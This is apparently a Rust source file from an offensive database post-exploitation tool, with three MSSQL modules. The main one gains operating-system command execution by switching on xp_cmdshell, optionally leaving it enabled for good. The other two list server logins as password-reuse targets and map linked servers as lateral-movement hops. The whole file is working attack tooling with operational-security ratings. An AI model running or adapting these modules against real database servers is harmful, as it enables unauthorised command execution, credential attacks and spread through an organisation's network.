//! MSSQL modules — verify-then-execute. check() never mutates state.

use crate::{query_text, Conn};
use async_trait::async_trait;
use dbx_core::*;

pub fn catalog() -> Vec<ModuleMeta> {
    vec![XpCmdshell::META, EnumLogins::META, EnumLinked::META]
}

pub fn instantiate(name: &str, client: Conn) -> Result<Box<dyn Module>, AuthError> {
    match name {
        "xp-cmdshell" => Ok(Box::new(XpCmdshell { client })),
        "enum-logins" => Ok(Box::new(EnumLogins { client })),
        "enum-linked" => Ok(Box::new(EnumLinked { client })),
        _ => Err(AuthError::Protocol(format!(
            "unknown module '{name}' (try -L)"
        ))),
    }
}

// ---------- shared helpers ----------

async fn is_sysadmin(c: &Conn) -> Result<bool, AuthError> {
    let rows = query_text(c, "SELECT IS_SRVROLEMEMBER('sysadmin')").await?;
    Ok(rows
        .first()
        .and_then(|r| r.first())
        .map(|s| s == "1")
        .unwrap_or(false))
}

async fn scalar(c: &Conn, sql: &str) -> Result<String, AuthError> {
    let rows = query_text(c, sql).await?;
    Ok(rows
        .first()
        .and_then(|r| r.first())
        .cloned()
        .unwrap_or_default())
}

#[allow(dead_code)] // reserved for upcoming option-taking modules
fn req<'a>(opts: &'a ModuleOptions, key: &str) -> Result<&'a String, AuthError> {
    opts.get(key).ok_or_else(|| {
        AuthError::Protocol(format!(
            "missing required option --{}",
            key.to_lowercase().replace('_', "-")
        ))
    })
}

// ---------- xp-cmdshell ----------

struct XpCmdshell {
    client: Conn,
}

impl XpCmdshell {
    const META: ModuleMeta = ModuleMeta {
        name: "xp-cmdshell",
        description: "RCE via xp_cmdshell. Needs sysadmin. --cmd runs a command with full output capture (temp-enables xp_cmdshell, restores after). --xp-reconfig on|off sets xp_cmdshell PERSISTENTLY (bare --xp-reconfig = on)",
        opsec: Opsec::Amber,
        options: &[
            ModuleOpt { name: "CMD", description: "OS command to run (output is captured and printed)", required: false },
            ModuleOpt { name: "RECONFIG", description: "on/off: persistently enable/disable xp_cmdshell and leave it that way", required: false },
        ],
    };
}

#[async_trait]
impl Module for XpCmdshell {
    fn meta(&self) -> ModuleMeta {
        Self::META
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        if !is_sysadmin(&self.client).await? {
            return Ok(CheckResult {
                possible: false,
                detail: "not sysadmin — cannot enable or run xp_cmdshell".into(),
            });
        }
        // xp_cmdshell does not exist on SQL Server for Linux (sp_configure
        // errors 15392). dm_os_host_info exists 2017+; empty = assume Windows.
        let platform = scalar(&self.client, "SELECT host_platform FROM sys.dm_os_host_info")
            .await
            .unwrap_or_default();
        if platform.eq_ignore_ascii_case("linux") {
            return Ok(CheckResult {
                possible: false,
                detail: "SQL Server on Linux — xp_cmdshell unsupported on this platform (15392)".into(),
            });
        }
        let state = scalar(
            &self.client,
            "SELECT CAST(value_in_use AS int) FROM sys.configurations WHERE name = 'xp_cmdshell'",
        )
        .await?;
        let version = scalar(&self.client, "SELECT @@VERSION").await.unwrap_or_default();
        let short = version.lines().next().unwrap_or("?").to_string();
        Ok(CheckResult {
            possible: true,
            detail: format!(
                "sysadmin; xp_cmdshell currently {}; {}",
                if state == "1" { "ENABLED" } else { "disabled (will enable+restore)" },
                short
            ),
        })
    }

    async fn run(&self, opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let mut lines = Vec::new();

        // RECONFIG=on|off (bare --xp-reconfig => "true" => on):
        // persistently set xp_cmdshell state and LEAVE it.
        let persist: Option<bool> = match opts.get("RECONFIG").map(|s| s.to_lowercase()) {
            Some(s) if matches!(s.as_str(), "on" | "true" | "enable" | "1") => Some(true),
            Some(s) if matches!(s.as_str(), "off" | "false" | "disable" | "0") => Some(false),
            Some(other) => {
                return Err(AuthError::Protocol(format!(
                    "bad RECONFIG value '{other}' (use on/off)"
                )))
            }
            None => None,
        };

        // xp_cmdshell is an advanced option: sp_configure errors 15123 unless
        // 'show advanced options' is on. Track what WE changed; restore exactly.
        let had_advanced = scalar(
            &self.client,
            "SELECT CAST(value_in_use AS int) FROM sys.configurations WHERE name = 'show advanced options'",
        )
        .await?
            == "1";
        let was_enabled = scalar(
            &self.client,
            "SELECT CAST(value_in_use AS int) FROM sys.configurations WHERE name = 'xp_cmdshell'",
        )
        .await?
            == "1";

        if !had_advanced {
            query_text(&self.client, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
                .await?;
        }

        // desired state during this run: RECONFIG value, else ON (needed for CMD)
        let target_state = persist.unwrap_or(true);
        if was_enabled != target_state {
            query_text(
                &self.client,
                &format!(
                    "EXEC sp_configure 'xp_cmdshell', {}; RECONFIGURE;",
                    target_state as i32
                ),
            )
            .await?;
        }

        if let Some(state) = persist {
            lines.push(format!(
                "xp_cmdshell now {} (PERSISTENT — left as set, no restore)",
                if state { "ENABLED" } else { "disabled" }
            ));
        } else if !was_enabled {
            lines.push("xp_cmdshell was disabled — enabled for this execution".into());
        }

        // execute CMD if given and xp_cmdshell is currently on
        if let Some(cmd) = opts.get("CMD") {
            if persist == Some(false) {
                lines.push("xp_cmdshell is off after RECONFIG=off — skipping CMD".into());
            } else {
                let esc = cmd.replace('\'', "''");
                let out = query_text(&self.client, &format!("EXEC xp_cmdshell '{esc}'")).await?;
                lines.push(format!("$ {cmd}"));
                for row in out {
                    for cell in row {
                        if cell != "NULL" {
                            lines.push(cell);
                        }
                    }
                }
            }
        } else if persist.is_none() {
            return Err(AuthError::Protocol(
                "nothing to do: give --cmd and/or --xp-reconfig on|off".into(),
            ));
        }

        // restore in non-persist mode only; xp_cmdshell off BEFORE advanced off
        if persist.is_none() && !was_enabled {
            let _ = query_text(&self.client, "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;").await;
            lines.push("xp_cmdshell restored to disabled".into());
        }
        if !had_advanced {
            let _ =
                query_text(&self.client, "EXEC sp_configure 'show advanced options', 0; RECONFIGURE;")
                    .await;
        }

        Ok(ModuleResult { lines })
    }
}

// ---------- enum-logins ----------

struct EnumLogins {
    client: Conn,
}

impl EnumLogins {
    const META: ModuleMeta = ModuleMeta {
        name: "enum-logins",
        description: "List server logins with type, disabled state, and sysadmin membership — your password-reuse target list",
        opsec: Opsec::Green,
        options: &[],
    };
}

#[async_trait]
impl Module for EnumLogins {
    fn meta(&self) -> ModuleMeta {
        Self::META
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        Ok(CheckResult { possible: true, detail: "read-only catalog query".into() })
    }

    async fn run(&self, _opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let rows = query_text(
            &self.client,
            "SELECT p.name, p.type_desc, ISNULL(p.is_disabled, 0),
                    CASE WHEN m.role_principal_id IS NOT NULL THEN 1 ELSE 0 END
             FROM sys.server_principals p
             LEFT JOIN sys.server_role_members m
               ON m.member_principal_id = p.principal_id
              AND m.role_principal_id = (SELECT principal_id FROM sys.server_principals WHERE name = 'sysadmin')
             WHERE p.type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN', 'WINDOWS_GROUP')
             ORDER BY 4 DESC, 1",
        )
        .await?;
        let lines = rows
            .iter()
            .map(|r| {
                let mut flags = Vec::new();
                if r.get(3).map(|s| s.as_str()) == Some("1") { flags.push("SYSADMIN"); }
                if r.get(2).map(|s| s.as_str()) == Some("1") { flags.push("disabled"); }
                flags.push(match r.get(1).map(|s| s.as_str()) {
                    Some("SQL_LOGIN") => "sql",
                    Some("WINDOWS_LOGIN") => "windows",
                    Some("WINDOWS_GROUP") => "win-group",
                    _ => "?",
                });
                format!("{} [{}]", r.first().map(|s| s.as_str()).unwrap_or("?"), flags.join(", "))
            })
            .collect();
        Ok(ModuleResult { lines })
    }
}

// ---------- enum-linked ----------

struct EnumLinked {
    client: Conn,
}

impl EnumLinked {
    const META: ModuleMeta = ModuleMeta {
        name: "enum-linked",
        description: "List linked servers and RPC-out state — each one is a potential lateral-movement hop (exec chains come in M3)",
        opsec: Opsec::Green,
        options: &[],
    };
}

#[async_trait]
impl Module for EnumLinked {
    fn meta(&self) -> ModuleMeta {
        Self::META
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        Ok(CheckResult { possible: true, detail: "read-only catalog query".into() })
    }

    async fn run(&self, _opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let rows = query_text(
            &self.client,
            "SELECT name, data_source, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1 ORDER BY name",
        )
        .await?;
        if rows.is_empty() {
            return Ok(ModuleResult { lines: vec!["no linked servers".into()] });
        }
        let lines = rows
            .iter()
            .map(|r| {
                let rpc = if r.get(2).map(|s| s.as_str()) == Some("1") {
                    "rpc-out ON  <-- chain candidate"
                } else {
                    "rpc-out off"
                };
                format!(
                    "{} -> {} [{}]",
                    r.first().map(|s| s.as_str()).unwrap_or("?"),
                    r.get(1).map(|s| s.as_str()).unwrap_or("?"),
                    rpc
                )
            })
            .collect();
        Ok(ModuleResult { lines })
    }
}
